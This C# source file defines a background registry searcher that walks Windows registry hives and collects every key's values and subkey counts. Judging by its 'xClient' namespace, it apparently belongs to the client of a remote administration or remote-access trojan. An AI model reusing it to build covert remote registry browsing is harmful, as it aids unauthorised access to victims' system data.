using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security;
using Microsoft.Win32;
using System.Threading;
using xClient.KuuhakuÇekirdek.Eklentiler;

namespace xClient.KuuhakuÇekirdek.KayıtDefteri
{

    public class MatchFoundEventArgs : EventArgs
    {
        public RegSeekerMatch Match { get; private set; }

        public MatchFoundEventArgs(RegSeekerMatch match)
        {
            Match = match;
        }
    }

    public class SearchCompletedEventArgs : EventArgs
    {
        public List<RegSeekerMatch> Matches { get; private set; }

        public SearchCompletedEventArgs(List<RegSeekerMatch> matches)
        {
            Matches = matches;
        }
    }

    public class RegistrySeeker
    {
        #region CONSTANTS

        public static readonly RegistryKey[] ROOT_KEYS = new RegistryKey[]
        {
            Microsoft.Win32.Registry.ClassesRoot,
            Microsoft.Win32.Registry.CurrentUser,
            Microsoft.Win32.Registry.LocalMachine,
            Microsoft.Win32.Registry.Users,
            Microsoft.Win32.Registry.CurrentConfig
        };

        #endregion

        #region Fields
        public event EventHandler<SearchCompletedEventArgs> SearchComplete;
        public event EventHandler<MatchFoundEventArgs> MatchFound;
        private BackgroundWorker searcher;

        private readonly object locker = new object();

        public RegistrySeekerParams searchArgs;

        private List<RegSeekerMatch> matches;
        private Queue<string> pendingKeys;

        #endregion

        public RegistrySeeker()
        {
            searcher = new BackgroundWorker() { WorkerSupportsCancellation = true, WorkerReportsProgress = true };

            searcher.DoWork += new DoWorkEventHandler(worker_DoWork);
            searcher.RunWorkerCompleted += new RunWorkerCompletedEventHandler(worker_RunWorkerCompleted);
            searcher.ProgressChanged += new ProgressChangedEventHandler(worker_ProgressChanged);
        }

        public void Start(string rootKeyName)
        {
            if (rootKeyName != null && rootKeyName.Length > 0)
            {
                RegistryKey root = GetRootKey(rootKeyName);

                if (root != null)
                {
                    if (root.Name != rootKeyName)
                    {
                        string subKeyName = rootKeyName.Substring(root.Name.Length + 1);
                        root = root.OpenReadonlySubKeySafe(subKeyName);
                    }
                }

                if (root != null)
                    Start(new RegistrySeekerParams(root));
            }
        }

        public void Start(RegistrySeekerParams args)
        {
            searchArgs = args;

            matches = new List<RegSeekerMatch>();
            searcher.RunWorkerAsync();
        }

        void worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            MatchFound(this, new MatchFoundEventArgs((RegSeekerMatch)e.UserState));
        }

        public void Stop()
        {
            if (searcher.IsBusy)
            {
                lock (locker)
                {
                    searcher.CancelAsync();
                    Monitor.Wait(locker);
                }
            }
        }

        void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            SearchComplete(this, new SearchCompletedEventArgs(matches));
        }

        void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            if (searchArgs.RootKey == null)
            {
                foreach (RegistryKey key in RegistrySeeker.ROOT_KEYS)
                    ProcessKey(key, key.Name);
            }
            else
            {
                Search(searchArgs.RootKey);
            }
        }

        void Search(string rootKeyName)
        {
            try
            {
                using (RegistryKey key = GetRootKey(rootKeyName).OpenReadonlySubKeySafe(rootKeyName))
                {
                    if (key != null)
                    {
                        Search(key);
                    }
                }
            }
            catch
            { }
        }

        void Search(RegistryKey rootKey)
        {
            string rootKeyName = rootKey.Name.Substring(rootKey.Name.LastIndexOf('\\') + 1);

            RegistryKey subKey = null;
            string keyName;
            int cropIndex = rootKey.Name.Length + 1;
            pendingKeys = new Queue<string>(rootKey.GetSubKeyNames());

            while (pendingKeys.Count > 0)
            {
                if (searcher.CancellationPending)
                {
                    lock (locker)
                    {
                        Monitor.Pulse(locker);
                        return;
                    }
                }

                keyName = pendingKeys.Dequeue();

                try
                {
                    subKey = rootKey.OpenSubKey(keyName);
                }
                catch (SecurityException)
                {
                    subKey = null;
                }
                finally
                {
                    ProcessKey(subKey, keyName);
                }
            }
        }

        private void ProcessKey(RegistryKey key, string keyName)
        {
            if (searcher.CancellationPending)
                return;

            MatchData(key, keyName);
        }

        private void MatchData(RegistryKey key, string keyName)
        {
            if (key != null)
            {
                List<RegValueData> values = new List<RegValueData>();

                foreach (string valueName in key.GetValueNames())
                {
                    RegistryValueKind valueType = key.GetValueKind(valueName);
                    object valueData = key.GetValue(valueName);
                    values.Add(new RegValueData(valueName, valueType, valueData));
                }

                AddMatch(keyName, values, key.SubKeyCount);
            }
            else
            {
                AddMatch(keyName, null, 0);
            }

        }

        private void AddMatch(string key, List<RegValueData> values, int subkeycount)
        {
            RegSeekerMatch match = new RegSeekerMatch(key, values, subkeycount);

            if (MatchFound != null)
                searcher.ReportProgress(0, match);

            matches.Add(match);

        }

        public static RegistryKey GetRootKey(string subkey_fullpath)
        {
            string[] path = subkey_fullpath.Split('\\');

            switch (path[0])
            {
                case "HKEY_CLASSES_ROOT":
                    return Microsoft.Win32.Registry.ClassesRoot;
                case "HKEY_CURRENT_USER":
                    return Microsoft.Win32.Registry.CurrentUser;
                case "HKEY_LOCAL_MACHINE":
                    return Microsoft.Win32.Registry.LocalMachine;
                case "HKEY_USERS":
                    return Microsoft.Win32.Registry.Users;
                case "HKEY_CURRENT_CONFIG":
                    return Microsoft.Win32.Registry.CurrentConfig;
                default:
                    throw new Exception("Hatalı rootkey, bulunamadı");
            }
        }

        public bool IsBusy
        {
            get { return searcher.IsBusy; }
        }
    }
}
